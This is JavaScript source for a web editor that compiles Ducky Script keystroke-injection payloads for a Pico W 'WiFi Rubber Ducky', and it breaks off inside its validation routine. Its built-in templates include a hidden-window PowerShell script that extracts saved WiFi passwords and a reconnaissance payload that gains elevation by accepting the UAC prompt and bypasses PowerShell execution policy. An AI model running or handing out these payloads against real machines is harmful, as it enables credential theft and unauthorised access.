/**
 * WiFi Ducky Script Compiler - Enhanced Edition
 * Complete .oqs payload generator with full Ducky Script support
 * 
 * Author: NikhilMunda (Enhanced by AI)
 * Project: OverQuack - WiFi Rubber Ducky for Raspberry Pi Pico W
 * License: GPLv2.0
 * 
 * MAJOR ENHANCEMENTS:
 * - Complete Monaco Editor integration with Ducky Script syntax
 * - Real-time validation and error detection
 * - Advanced template system
 * - Full .oqs file generation support
 * - Comprehensive keyboard shortcuts
 * - Theme system with persistence
 * - Advanced error handling and user feedback
 * - Memory usage monitoring
 * - Drag-and-drop file support
 * - Responsive design support
 */

class WiFiDuckyCompiler {
    constructor() {
        // Application state
        this.editor = null;
        this.isInitialized = false;
        this.compiledPayload = null;
        this.currentTheme = 'dark';
        this.isCompiling = false;
       // this.currentTheme = localStorage.getItem('ducky-theme') || 'light';
        this.autoSave = true;
        this.autoCompile = false;
        this.strictValidation = true;

        // Script statistics
        this.stats = {
            lines: 0,
            variables: 0,
            functions: 0,
            memoryUsage: 0
        };

        // Ducky Script command definitions based on customise_fixed_complete.py
        this.duckyCommands = [
            // Basic keyboard commands
            'STRING', 'STRINGLN', 'DELAY', 'ENTER', 'TAB', 'SPACE', 'BACKSPACE',
            'GUI', 'ALT', 'CTRL', 'SHIFT', 'ESC', 'DELETE', 'HOME', 'END',
            'RSHIFT', 'CAPSLOCK', 'UPARROW', 'DOWNARROW', 'LEFTARROW', 'RIGHTARROW',
            'INSERT', 'NUMLOCK', 'PRINTSCREEN', 'SCROLLLOCK', 'PAGEUP', 'PAGEDOWN',
            'UP', 'DOWN', 'LEFT', 'RIGHT', 'BREAK', 'PAUSE',

            // Function keys
            'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12',
            'F13', 'F14', 'F15', 'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24',

            // Media keys
            'MK_VOLUP', 'MK_VOLDOWN', 'MK_MUTE', 'MK_NEXT', 'MK_PREV', 'MK_PP', 'MK_STOP',

            // Mouse commands
            'MOUSE_CLICK', 'MOUSE_PRESS', 'MOUSE_RELEASE', 'MOUSE_MOVE', 'MOUSE_SCROLL',
            'JIGGLE_MOUSE', 'BACKGROUND_JIGGLE_MOUSE',

            // Advanced features
            'VAR', 'DEFINE', 'FUNCTION', 'END_FUNCTION', 'IF', 'ELSE_IF', 'ELSE', 'END_IF',
            'WHILE', 'END_WHILE', 'REPEAT', 'HOLD', 'RELEASE', 'RELEASE_ALL',

            // String blocks
            'STRING_BLOCK', 'END_STRING', 'STRINGLN_BLOCK', 'END_STRINGLN',

            // Comments and special
            'REM', 'REM_BLOCK', 'END_REM', 'IMPORT', 'PRINT', 'SELECT_LAYOUT',
            'DEFAULT_DELAY', 'RESTART_PAYLOAD', 'STOP_PAYLOAD',

            // Strip controls
            'DISABLE_STRIP', 'ENABLE_STRIP'
        ];

        // Mouse button options
        this.mouseButtons = ['LEFT', 'RIGHT', 'MIDDLE'];

        // Keyboard layouts supported
        this.layouts = [
            'US', 'US_DVO', 'WIN_FR', 'WIN_DE', 'WIN_ES', 'WIN_IT', 'WIN_BR',
            'WIN_CZ', 'WIN_DA', 'WIN_HU', 'WIN_PO', 'WIN_SW', 'WIN_TR', 'WIN_UK', 'MAC_FR'
        ];

        // Internal and random variables
        this.internalVariables = [
            '$_CAPSLOCK_ON', '$_NUMLOCK_ON', '$_SCROLLLOCK_ON',
            '$_BSSID', '$_SSID', '$_PASSWD', '$_RANDOM_MIN', '$_RANDOM_MAX'
        ];

        this.randomVariables = [
            '$_RANDOM_INT', '$_RANDOM_NUMBER', '$_RANDOM_LOWERCASE_LETTER',
            '$_RANDOM_UPPERCASE_LETTER', '$_RANDOM_LETTER', '$_RANDOM_SPECIAL', '$_RANDOM_CHAR'
        ];

        // Template library
        this.templates = [
            {
                name: "Basic Windows Info Grab",
                description: "Collects system information on Windows",
                category: "Information Gathering",
                code: `REM Basic Windows Information Collection
REM OverQuack WiFi Ducky Payload
REM Collects system info and network details

VAR $output_file = "C:\\temp\\system_info.txt"
VAR $delay_fast = 100
VAR $delay_slow = 500

REM Check if temp directory exists, create if needed
GUI r
DELAY $delay_slow
STRING cmd /c "if not exist C:\temp mkdir C:\temp"
ENTER
DELAY 1000

REM Open elevated command prompt
GUI r
DELAY $delay_slow
STRING cmd
CTRL SHIFT ENTER
DELAY 2000
ALT y
DELAY 1000

REM Collect system information
STRINGLN echo ===== SYSTEM INFORMATION ===== > $output_file
STRINGLN systeminfo >> $output_file
STRINGLN echo. >> $output_file
STRINGLN echo ===== NETWORK CONFIGURATION ===== >> $output_file
STRINGLN ipconfig /all >> $output_file
STRINGLN echo. >> $output_file
STRINGLN echo ===== INSTALLED PROGRAMS ===== >> $output_file
STRINGLN wmic product get name,version >> $output_file
STRINGLN echo. >> $output_file
STRINGLN echo ===== RUNNING PROCESSES ===== >> $output_file
STRINGLN tasklist >> $output_file
STRINGLN echo Collection completed!
STRINGLN exit`
            },
            {
                name: "WiFi Password Extractor",
                description: "Extracts saved WiFi passwords on Windows",
                category: "Credential Harvesting",
                code: `REM WiFi Password Extraction Tool
REM Extracts all saved WiFi passwords from Windows

VAR $output_file = "C:\\temp\\wifi_passwords.txt"
VAR $temp_script = "C:\\temp\\extract_wifi.ps1"

REM Create PowerShell script for WiFi extraction
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000

STRING_BLOCK
# WiFi Password Extraction Script
$output = "$output_file"
"===== WIFI PASSWORD EXTRACTION =====" | Out-File $output -Encoding UTF8

# Get all WiFi profiles
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }

foreach ($profile in $profiles) {
    "\n--- Profile: $profile ---" | Out-File $output -Append -Encoding UTF8
    $password = netsh wlan show profile "$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
    if ($password) {
        "Password: $password" | Out-File $output -Append -Encoding UTF8
    } else {
        "Password: [No password or access denied]" | Out-File $output -Append -Encoding UTF8
    }
}

"\n===== EXTRACTION COMPLETED =====" | Out-File $output -Append -Encoding UTF8
Write-Host "WiFi passwords saved to $output"
END_STRING

ENTER
DELAY 2000
STRING exit
ENTER`
            },
            {
                name: "USB Rubber Ducky Test",
                description: "Test payload to verify Ducky functionality",
                category: "Testing",
                code: `REM USB Rubber Ducky Functionality Test
REM Tests various Ducky Script commands
REM Author: WiFi Ducky Compiler

PRINT Starting WiFi Ducky test sequence...

REM Test basic delays and keyboard
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 2000

REM Test string commands
STRING_BLOCK
=== WiFi Ducky Functionality Test ===

This payload tests various Ducky Script features:

1. Basic typing (STRING/STRINGLN)
2. Keyboard shortcuts
3. Variables and functions
4. Mouse operations
5. Conditional logic

Test timestamp: $_RANDOM_NUMBER:8
Device BSSID: $_BSSID
Network SSID: $_SSID
END_STRING

ENTER
ENTER

REM Test variables
VAR $test_var = "WiFi Ducky is working!"
VAR $counter = 5

STRINGLN Testing variable: $test_var
STRINGLN Counter value: $counter

REM Test function
FUNCTION test_function
    STRINGLN This is a user-defined function
    MOUSE_MOVE 50 50
    DELAY 200
    MOUSE_CLICK LEFT
END_FUNCTION

STRINGLN Calling test function:
test_function

REM Test conditional logic
IF $counter > 3
    STRINGLN Counter is greater than 3
ELSE
    STRINGLN Counter is 3 or less  
END_IF

REM Test loop
WHILE $counter > 0
    STRINGLN Loop iteration: $counter
    $counter = $counter - 1
    DELAY 200
END_WHILE

STRINGLN
STRINGLN === Test completed successfully! ===
STRINGLN WiFi Ducky is fully functional.

REM Save the test file
CTRL s
DELAY 1000
STRING wifi_ducky_test_$_RANDOM_NUMBER:4.txt
ENTER`
            },
            {
                name: "Advanced Payload Template",
                description: "Template showing advanced Ducky Script features",
                category: "Advanced",
                code: `REM Advanced WiFi Ducky Payload Template
REM Demonstrates all major Ducky Script features
REM Compatible with customise_fixed_complete.py

REM Author information
REM Project: OverQuack WiFi Rubber Ducky
REM Target: Windows 10/11 systems

REM Configuration variables
VAR $target_user = "Administrator"
VAR $delay_short = 100
VAR $delay_medium = 500
VAR $delay_long = 1000
VAR $output_path = "C:\\Users\\Public\\Documents"
DEFINE SUPER_FAST 50
DEFINE ULTRA_SLOW 2000

REM Random values for uniqueness
VAR $session_id = $_RANDOM_NUMBER:8
VAR $temp_name = "temp_$_RANDOM_CHAR:6"

PRINT Advanced payload starting - Session: $session_id

REM Function definitions
FUNCTION open_elevated_cmd
    GUI r
    DELAY $delay_medium
    STRING cmd
    CTRL SHIFT ENTER
    DELAY $delay_long
    ALT y
    DELAY $delay_medium
END_FUNCTION

FUNCTION create_log_entry
    STRINGLN [$(Get-Date)] Payload executed - Session: $session_id
    STRINGLN Target User: $target_user
    STRINGLN System BSSID: $_BSSID
    STRINGLN Network: $_SSID
    STRINGLN Random Identifier: $_RANDOM_LETTER:4-$_RANDOM_NUMBER:4
END_FUNCTION

REM Check system state
IF $_CAPSLOCK_ON == 1
    PRINT Caps lock is on, turning off
    CAPSLOCK
    DELAY $delay_short
END_IF

IF $_NUMLOCK_ON == 0
    PRINT Num lock is off, turning on  
    NUMLOCK
    DELAY $delay_short
END_IF

REM Main payload execution
open_elevated_cmd

REM Create output directory
STRINGLN if not exist "$output_path" mkdir "$output_path"
DELAY $delay_short

REM Start PowerShell for advanced operations
STRINGLN powershell -ExecutionPolicy Bypass
DELAY $delay_long

REM Multi-line PowerShell command using STRING_BLOCK
STRING_BLOCK
# Advanced system reconnaissance script
$logFile = "$output_path\recon_$session_id.txt"
$errorFile = "$output_path\errors_$session_id.txt"

try {
    "=== ADVANCED SYSTEM RECONNAISSANCE ===" | Tee-Object $logFile

    # System information
    "\n--- SYSTEM INFO ---" | Tee-Object $logFile -Append
    Get-ComputerInfo | Select-Object WindowsProductName, WindowsVersion, TotalPhysicalMemory | Tee-Object $logFile -Append

    # Network interfaces  
    "\n--- NETWORK INTERFACES ---" | Tee-Object $logFile -Append
    Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object Name, InterfaceDescription, LinkSpeed | Tee-Object $logFile -Append

    # WiFi profiles
    "\n--- WIFI PROFILES ---" | Tee-Object $logFile -Append
    (netsh wlan show profiles) -match 'All User Profile' | ForEach-Object { ($_ -split ':')[-1].Trim() } | Tee-Object $logFile -Append

    # Running services
    "\n--- CRITICAL SERVICES ---" | Tee-Object $logFile -Append
    Get-Service | Where-Object Status -eq 'Running' | Where-Object Name -match 'Windows|Security|Firewall|Defender' | Select-Object Name, Status | Tee-Object $logFile -Append

    "\n=== RECONNAISSANCE COMPLETED ===" | Tee-Object $logFile -Append
    Write-Host "Data saved to $logFile" -ForegroundColor Green

} catch {
    $_.Exception.Message | Tee-Object $errorFile -Append
    Write-Host "Error occurred - check $errorFile" -ForegroundColor Red
}
END_STRING

ENTER
DELAY ULTRA_SLOW

REM Test mouse operations
MOUSE_MOVE 200 200
DELAY $delay_short
MOUSE_CLICK LEFT
DELAY $delay_short
MOUSE_MOVE -100 -100
MOUSE_CLICK RIGHT

REM Advanced loop with conditional
VAR $retry_count = 3
WHILE $retry_count > 0
    STRINGLN Retry attempt: $retry_count

    IF $retry_count == 2
        STRINGLN Middle retry - checking status
        MOUSE_JIGGLE 1000
    ELSE_IF $retry_count == 1  
        STRINGLN Final retry - preparing to exit
        DELAY SUPER_FAST
    ELSE
        STRINGLN Initial attempt
    END_IF

    $retry_count = $retry_count - 1
    DELAY $delay_medium
END_WHILE

REM Cleanup and exit
STRINGLN Write-Host "Payload execution completed at $(Get-Date)" -ForegroundColor Cyan
STRINGLN exit
ENTER

PRINT Advanced payload completed successfully

REM Optional: Restart payload for persistence
REM RESTART_PAYLOAD`
            }
        ];

        // Keyboard shortcuts
        this.shortcuts = {
            'Ctrl+N': () => this.newScript(),
            'Ctrl+O': () => this.openFile(),
            'Ctrl+S': () => this.saveScript(),
            'Ctrl+Enter': () => this.compileScript(),
            'F5': () => this.validateScript(),
            'Ctrl+K': () => this.clearConsole(),
            'F1': () => this.showHelp(),
            'F11': () => this.toggleFullscreen()
        };

        // Console messages
        this.consoleMessages = [];

        // Initialize the application
        this.init();
    }

    /**
     * Initialize the application
     */
    async init() {
        try {
            this.showLoadingOverlay();
            await this.initializeMonacoEditor();
            this.setupEventListeners();
            this.setupKeyboardShortcuts();
            this.setupDragAndDrop();
            this.applyTheme(this.currentTheme);
            this.populateTemplates();
            this.populateDocumentation();
            this.hideLoadingOverlay();
            this.isInitialized = true;
            this.logMessage('info', 'WiFi Ducky Compiler initialized successfully');
        } catch (error) {
            console.error('Initialization error:', error);
            this.showToast('error', 'Initialization Error', 'Failed to initialize the compiler. Please refresh the page.');
        }
    }

    /**
     * Show loading overlay with progress
     */
    showLoadingOverlay() {
        const overlay = document.getElementById('loading-overlay');
        const progressBar = document.getElementById('loading-bar');
        overlay.classList.remove('hidden');

        // Simulate loading progress
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.random() * 15;
            if (progress > 100) progress = 100;
            progressBar.style.width = `${progress}%`;

            if (progress >= 100) {
                clearInterval(interval);
            }
        }, 200);
    }

    /**
     * Hide loading overlay
     */
    hideLoadingOverlay() {
        setTimeout(() => {
            document.getElementById('loading-overlay').classList.add('hidden');
        }, 500);
    }

    /**
     * Initialize Monaco Editor with Ducky Script support
     */
    async initializeMonacoEditor() {
        return new Promise((resolve, reject) => {
            require.config({ paths: { vs: 'https://unpkg.com/monaco-editor@0.45.0/min/vs' } });

            require(['vs/editor/editor.main'], () => {
                try {
                    // Define Ducky Script language
                    monaco.languages.register({ id: 'duckyscript' });

                    // Define syntax highlighting
                    monaco.languages.setMonarchTokensProvider('duckyscript', {
                        tokenizer: {
                            root: [
                                // Comments
                                [/REM.*$/, 'comment'],
                                [/\/\/.*$/, 'comment'],
                                [/\/\*/, 'comment', '@comment'],

                                // String blocks
                                [/STRING_BLOCK/, 'keyword', '@string_block'],
                                [/STRINGLN_BLOCK/, 'keyword', '@stringln_block'],

                                // Keywords
                                [/\b(STRING|STRINGLN|DELAY|ENTER|TAB|SPACE|BACKSPACE)\b/, 'keyword'],
                                [/\b(GUI|ALT|CTRL|SHIFT|ESC|DELETE|HOME|END)\b/, 'keyword'],
                                [/\b(UP|DOWN|LEFT|RIGHT|PAGEUP|PAGEDOWN)\b/, 'keyword'],
                                [/\b(F[0-9]+|CAPSLOCK|NUMLOCK|SCROLLLOCK)\b/, 'keyword'],
                                [/\b(MOUSE_CLICK|MOUSE_MOVE|MOUSE_SCROLL|JIGGLE_MOUSE)\b/, 'keyword'],
                                [/\b(VAR|DEFINE|FUNCTION|END_FUNCTION)\b/, 'keyword.control'],
                                [/\b(IF|ELSE_IF|ELSE|END_IF|WHILE|END_WHILE)\b/, 'keyword.control'],
                                [/\b(REPEAT|IMPORT|PRINT|SELECT_LAYOUT)\b/, 'keyword'],
                                [/\b(HOLD|RELEASE|RELEASE_ALL|DEFAULT_DELAY)\b/, 'keyword'],

                                // Variables
                                [/\$[a-zA-Z_][a-zA-Z0-9_]*/, 'variable'],
                                [/\$_[A-Z_]+/, 'variable.predefined'],

                                // Numbers
                                [/\b\d+\b/, 'number'],

                                // Strings
                                [/"([^"\\]|\\.)*$/, 'string.invalid'],
                                [/"/, 'string', '@string_double'],
                                [/'([^'\\]|\\.)*$/, 'string.invalid'],
                                [/'/, 'string', '@string_single'],

                                // Operators
                                [/[=<>!]=?/, 'operator'],
                                [/[+\-*\/]/, 'operator'],

                                // Mouse buttons
                                [/\b(LEFT|RIGHT|MIDDLE)\b/, 'constant'],

                                // Layouts
                                [/\b(US|WIN_FR|WIN_DE|MAC_FR)\b/, 'constant']
                            ],

                            comment: [
                                [/[^\/*]+/, 'comment'],
                                [/\*\//, 'comment', '@pop'],
                                [/[\/*]/, 'comment']
                            ],

                            string_double: [
                                [/[^\\"]+/, 'string'],
                                [/\\./, 'string.escape'],
                                [/"/, 'string', '@pop']
                            ],

                            string_single: [
                                [/[^\\']+/, 'string'],
                                [/\\./, 'string.escape'],
                                [/'/, 'string', '@pop']
                            ],

                            string_block: [
                                [/END_STRING/, 'keyword', '@pop'],
                                [/.*/, 'string']
                            ],

                            stringln_block: [
                                [/END_STRINGLN/, 'keyword', '@pop'],
                                [/.*/, 'string']
                            ]
                        }
                    });

                    // Define language configuration
                    monaco.languages.setLanguageConfiguration('duckyscript', {
                        comments: {
                            lineComment: 'REM',
                            blockComment: ['/*', '*/']
                        },
                        brackets: [
                            ['(', ')'],
                            ['[', ']'],
                            ['{', '}']
                        ],
                        autoClosingPairs: [
                            { open: '(', close: ')' },
                            { open: '[', close: ']' },
                            { open: '{', close: '}' },
                            { open: '"', close: '"' },
                            { open: "'", close: "'" }
                        ],
                        surroundingPairs: [
                            { open: '(', close: ')' },
                            { open: '[', close: ']' },
                            { open: '{', close: '}' },
                            { open: '"', close: '"' },
                            { open: "'", close: "'" }
                        ]
                    });

                    // Define auto-completion
                    monaco.languages.registerCompletionItemProvider('duckyscript', {
                        provideCompletionItems: (model, position) => {
                            const word = model.getWordUntilPosition(position);
                            const range = {
                                startLineNumber: position.lineNumber,
                                endLineNumber: position.lineNumber,
                                startColumn: word.startColumn,
                                endColumn: word.endColumn
                            };

                            const suggestions = [];

                            // Add command suggestions
                            this.duckyCommands.forEach(command => {
                                suggestions.push({
                                    label: command,
                                    kind: monaco.languages.CompletionItemKind.Keyword,
                                    insertText: command,
                                    range: range,
                                    documentation: this.getCommandDocumentation(command)
                                });
                            });

                            // Add variable suggestions
                            [...this.internalVariables, ...this.randomVariables].forEach(variable => {
                                suggestions.push({
                                    label: variable,
                                    kind: monaco.languages.CompletionItemKind.Variable,
                                    insertText: variable,
                                    range: range,
                                    documentation: `Internal variable: ${variable}`
                                });
                            });

                            // Add layout suggestions
                            this.layouts.forEach(layout => {
                                suggestions.push({
                                    label: layout,
                                    kind: monaco.languages.CompletionItemKind.Constant,
                                    insertText: layout,
                                    range: range,
                                    documentation: `Keyboard layout: ${layout}`
                                });
                            });

                            // Add mouse button suggestions
                            this.mouseButtons.forEach(button => {
                                suggestions.push({
                                    label: button,
                                    kind: monaco.languages.CompletionItemKind.Constant,
                                    insertText: button,
                                    range: range,
                                    documentation: `Mouse button: ${button}`
                                });
                            });

                            return { suggestions };
                        }
                    });

                    // Create editor instance
                    this.editor = monaco.editor.create(document.getElementById('monaco-editor'), {
                        value: this.getDefaultScript(),
                        language: 'duckyscript',
                        theme: this.currentTheme === 'dark' ? 'vs-dark' : 'vs',
                        automaticLayout: true,
                        minimap: { enabled: true },
                        scrollBeyondLastLine: false,
                        fontSize: 14,
                        lineNumbers: 'on',
                        roundedSelection: false,
                        scrollbar: {
                            useShadows: false,
                            verticalHasArrows: true,
                            horizontalHasArrows: true,
                            vertical: 'visible',
                            horizontal: 'visible',
                            verticalScrollbarSize: 17,
                            horizontalScrollbarSize: 17
                        },
                        overviewRulerLanes: 3,
                        wordWrap: 'off',
                        rulers: [80, 120],
                        folding: true,
                        foldingHighlight: true,
                        showFoldingControls: 'mouseover',
                        cursorBlinking: 'blink',
                        cursorStyle: 'line',
                        renderWhitespace: 'selection',
                        renderControlCharacters: false,
                        fontLigatures: true,
                        smoothScrolling: true,
                        mouseWheelZoom: true
                    });

                    // Setup editor event listeners
                    this.editor.onDidChangeModelContent(() => {
                        this.updateStats();
                        this.updateCursorPosition();
                        if (this.autoSave) {
                            this.saveToLocalStorage();
                        }
                        if (this.autoCompile) {
                            this.debounceValidation();
                        }
                    });

                    this.editor.onDidChangeCursorPosition(() => {
                        this.updateCursorPosition();
                        this.updateSelectionInfo();
                    });

                    resolve();
                } catch (error) {
                    reject(error);
                }
            });
        });
    }

    /**
     * Get default script content
     */
    getDefaultScript() {
        return `REM WiFi Ducky Script - OverQuack Project
REM Author: NikhilMunda
REM Enhanced Compiler Version

REM Welcome to the enhanced WiFi Ducky compiler!
REM This editor supports full Ducky Script syntax with real-time validation

VAR $greeting = "Hello WiFi Ducky World!"
VAR $delay_time = 1000

PRINT Starting WiFi Ducky demonstration...

REM Open notepad for demonstration
GUI r
DELAY 500
STRING notepad
ENTER
DELAY $delay_time

REM Type our greeting
STRING $greeting
ENTER
ENTER

REM Show system information
STRING_BLOCK
WiFi Ducky System Info:
- Session ID: $_RANDOM_NUMBER:8
- Network BSSID: $_BSSID
- SSID: $_SSID
- Timestamp: $_RANDOM_LETTER:3-$_RANDOM_NUMBER:6

This payload was generated by the enhanced WiFi Ducky Compiler!
END_STRING

ENTER
ENTER
STRING Compilation successful! Ready for .oqs generation.

REM Save the demonstration file
CTRL s
DELAY 500
STRING wifi_ducky_demo_$_RANDOM_NUMBER:4.txt
ENTER

PRINT WiFi Ducky demonstration completed successfully!`;
    }

    getClearScript() {
        return `REM START YOUR CODE HERE - OverQuack Project`;
    }

    /**
     * Get command documentation
     */
    getCommandDocumentation(command) {
        const docs = {
            'STRING': 'Types the specified text',
            'STRINGLN': 'Types the specified text followed by ENTER',
            'DELAY': 'Waits for the specified number of milliseconds',
            'ENTER': 'Presses the Enter key',
            'TAB': 'Presses the Tab key',
            'SPACE': 'Presses the Space bar',
            'BACKSPACE': 'Presses the Backspace key',
            'GUI': 'Presses the Windows/Cmd key (optionally with modifier)',
            'ALT': 'Presses the Alt key (optionally with modifier)',
            'CTRL': 'Presses the Ctrl key (optionally with modifier)',
            'SHIFT': 'Presses the Shift key (optionally with modifier)',
            'MOUSE_CLICK': 'Clicks the specified mouse button (LEFT, RIGHT, MIDDLE)',
            'MOUSE_MOVE': 'Moves mouse by relative coordinates (x y)',
            'MOUSE_SCROLL': 'Scrolls mouse wheel (positive=up, negative=down)',
            'VAR': 'Defines a variable ($name = value)',
            'DEFINE': 'Defines a constant (NAME value)',
            'FUNCTION': 'Starts a function definition',
            'END_FUNCTION': 'Ends a function definition',
            'IF': 'Starts conditional block',
            'ELSE_IF': 'Else-if condition',
            'ELSE': 'Else block',
            'END_IF': 'Ends conditional block',
            'WHILE': 'Starts while loop',
            'END_WHILE': 'Ends while loop',
            'STRING_BLOCK': 'Starts multi-line string block',
            'END_STRING': 'Ends multi-line string block',
            'STRINGLN_BLOCK': 'Starts multi-line string block with line breaks',
            'END_STRINGLN': 'Ends multi-line string block with line breaks',
            'REM': 'Single line comment',
            'REM_BLOCK': 'Starts comment block',
            'END_REM': 'Ends comment block',
            'PRINT': 'Prints message to console/debug output',
            'SELECT_LAYOUT': 'Changes keyboard layout',
            'DEFAULT_DELAY': 'Sets default delay between commands',
            'REPEAT': 'Repeats previous commands',
            'JIGGLE_MOUSE': 'Jiggles mouse for specified duration',
            'BACKGROUND_JIGGLE_MOUSE': 'Jiggles mouse in background'
        };

        return docs[command] || `Command: ${command}`;
    }

    /**
     * Setup event listeners
     */
    setupEventListeners() {
        // Theme toggle
        document.getElementById('theme-toggle').addEventListener('click', () => {
            this.toggleTheme();
        });

        // Toolbar buttons
        document.getElementById('new-btn').addEventListener('click', () => this.newScript());
        document.getElementById('open-btn').addEventListener('click', () => this.openFile());
        document.getElementById('save-btn').addEventListener('click', () => this.saveScript());
        document.getElementById('compile-btn').addEventListener('click', () => this.compileScript());
        document.getElementById('validate-btn').addEventListener('click', () => this.validateScript());
        document.getElementById('download-btn').addEventListener('click', () => this.downloadPayload());
        document.getElementById('clear-console-btn').addEventListener('click', () => this.clearConsole());
        document.getElementById('settings-btn').addEventListener('click', () => this.showSettings());

        // Header buttons
        document.getElementById('help-btn').addEventListener('click', () => this.showHelp());
        document.getElementById('templates-btn').addEventListener('click', () => this.showTemplates());
        document.getElementById('fullscreen-btn').addEventListener('click', () => this.toggleFullscreen());

        // Editor controls
        document.getElementById('find-btn').addEventListener('click', () => this.showFindReplace());
        document.getElementById('format-btn').addEventListener('click', () => this.formatCode());
        document.getElementById('word-wrap-btn').addEventListener('click', () => this.toggleWordWrap());
        document.getElementById('minimap-btn').addEventListener('click', () => this.toggleMinimap());

        // Layout selector
        document.getElementById('layout-select').addEventListener('change', (e) => {
            this.updateLayoutSelection(e.target.value);
        });

        // Tab switching
        document.querySelectorAll('.tab-btn').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.switchTab(e.target.dataset.tab);
            });
        });

        // Modal close buttons
        document.querySelectorAll('.modal-close').forEach(btn => {
            btn.addEventListener('click', (e) => {
                this.closeModal(e.target.closest('.modal'));
            });
        });

        // File input
        document.getElementById('file-input').addEventListener('change', (e) => {
            this.handleFileSelect(e.target.files[0]);
        });

        // Settings
        document.getElementById('auto-save').addEventListener('change', (e) => {
            this.autoSave = e.target.checked;
            localStorage.setItem('ducky-auto-save', this.autoSave);
        });

        document.getElementById('auto-compile').addEventListener('change', (e) => {
            this.autoCompile = e.target.checked;
            localStorage.setItem('ducky-auto-compile', this.autoCompile);
        });

        document.getElementById('strict-validation').addEventListener('change', (e) => {
            this.strictValidation = e.target.checked;
            localStorage.setItem('ducky-strict-validation', this.strictValidation);
        });

        document.getElementById('font-size').addEventListener('input', (e) => {
            const fontSize = e.target.value;
            document.getElementById('font-size-value').textContent = `${fontSize}px`;
            if (this.editor) {
                this.editor.updateOptions({ fontSize: parseInt(fontSize) });
            }
        });

        // Close modals on outside click
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.closeModal(modal);
                }
            });
        });

        // Prevent form submission
        document.addEventListener('submit', (e) => {
            e.preventDefault();
        });
    }

    /**
     * Setup keyboard shortcuts
     */
    setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
            const key = this.getKeyCombo(e);
            if (this.shortcuts[key]) {
                e.preventDefault();
                this.shortcuts[key]();
            }
        });
    }

    /**
     * Get key combination string
     */
    getKeyCombo(e) {
        const parts = [];
        if (e.ctrlKey) parts.push('Ctrl');
        if (e.altKey) parts.push('Alt');
        if (e.shiftKey) parts.push('Shift');
        if (e.metaKey) parts.push('Meta');

        if (e.key && e.key !== 'Control' && e.key !== 'Alt' && e.key !== 'Shift' && e.key !== 'Meta') {
            parts.push(e.key);
        }

        return parts.join('+');
    }

    /**
     * Setup drag and drop functionality
     */
    setupDragAndDrop() {
        const dropOverlay = document.getElementById('drop-overlay');

        document.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropOverlay.classList.add('active');
        });

        document.addEventListener('dragleave', (e) => {
            if (!document.body.contains(e.relatedTarget)) {
                dropOverlay.classList.remove('active');
            }
        });

        document.addEventListener('drop', (e) => {
            e.preventDefault();
            dropOverlay.classList.remove('active');

            const files = e.dataTransfer.files;
            if (files.length > 0) {
                this.handleFileSelect(files[0]);
            }
        });
    }

    /**
     * Handle file selection
     */
    handleFileSelect(file) {
        if (!file) return;

        const allowedTypes = ['.oqs', '.txt', '.ds'];
        const fileExtension = file.name.toLowerCase().substring(file.name.lastIndexOf('.'));

        if (!allowedTypes.includes(fileExtension)) {
            this.showToast('error', 'Invalid File Type', `Please select a file with extension: ${allowedTypes.join(', ')}`);
            return;
        }

        const reader = new FileReader();
        reader.onload = (e) => {
            try {
                const content = e.target.result;
                this.editor.setValue(content);
                this.logMessage('success', `File loaded successfully: ${file.name}`);
                this.showToast('success', 'File Loaded', `Successfully loaded ${file.name}`);
            } catch (error) {
                this.logMessage('error', `Failed to load file: ${error.message}`);
                this.showToast('error', 'Load Error', 'Failed to load the selected file.');
            }
        };
        reader.readAsText(file);
    }

    /**
     * New script
     */
    newScript() {
        if (confirm('Create a new script? Any unsaved changes will be lost.')) {
            this.editor.setValue(this.getClearScript());
            this.clearConsole();
            this.logMessage('info', 'New script created');
            this.showToast('info', 'New Script', 'Created a new script with default template');
        }
    }

    /**
     * Open file dialog
     */
    openFile() {
        document.getElementById('file-input').click();
    }

    /**
     * Save script
     */
    saveScript() {
        const content = this.editor.getValue();
        const filename = `wifi_ducky_script_${Date.now()}.oqs`;

        this.downloadFile(content, filename, 'text/plain');
        this.logMessage('success', `Script saved as: ${filename}`);
        this.showToast('success', 'Script Saved', `Saved as ${filename}`);
    }

    /**
     * Compile script
     */
    async compileScript() {
        if (this.isCompiling) return;

        try {
            this.isCompiling = true;
            this.updateCompileButton(true);
            this.showProgress(true);
            this.clearConsole();

            const content = this.editor.getValue();
            this.logMessage('info', 'Starting compilation...');

            // Simulate compilation progress
            for (let i = 0; i <= 100; i += 20) {
                this.updateProgress(i);
                await new Promise(resolve => setTimeout(resolve, 100));
            }

            // Validate and compile
            const validationResult = await this.validateScript();
            if (!validationResult.isValid) {
                throw new Error('Validation failed');
            }

            // Generate compiled payload
            this.compiledPayload = await this.generatePayload(content);

            this.logMessage('success', 'Compilation completed successfully!');
            this.logMessage('info', `Generated payload size: ${this.compiledPayload.size} bytes`);
            this.logMessage('info', `Commands processed: ${this.compiledPayload.commands}`);
            this.logMessage('info', `Variables found: ${this.compiledPayload.variables}`);
            this.logMessage('info', `Functions found: ${this.compiledPayload.functions}`);

            // Enable download button
            document.getElementById('download-btn').disabled = false;

            this.showToast('success', 'Compilation Complete', 'Your .oqs payload is ready for download!');

        } catch (error) {
            this.logMessage('error', `Compilation failed: ${error.message}`);
            this.showToast('error', 'Compilation Failed', error.message);
        } finally {
            this.isCompiling = false;
            this.updateCompileButton(false);
            this.showProgress(false);
        }
    }

    /**
     * Validate script syntax
     */
    async validateScript() {
        const content = this.editor.getValue();
        const lines = content.split('\n');
        const errors = [];
        const warnings = [];

        let lineNumber = 0;
        let inStringBlock = false;
        let stringBlockType = '';
        let inCommentBlock = false;
        let functionDepth = 0;
        let ifDepth = 0;
        let whileDepth = 0;

        const variables = new Set();
        const functions = new Set();
        const defines = new Set();

        for (const line of lines) {
            lineNumber++;
            const trimmed = line.trim();

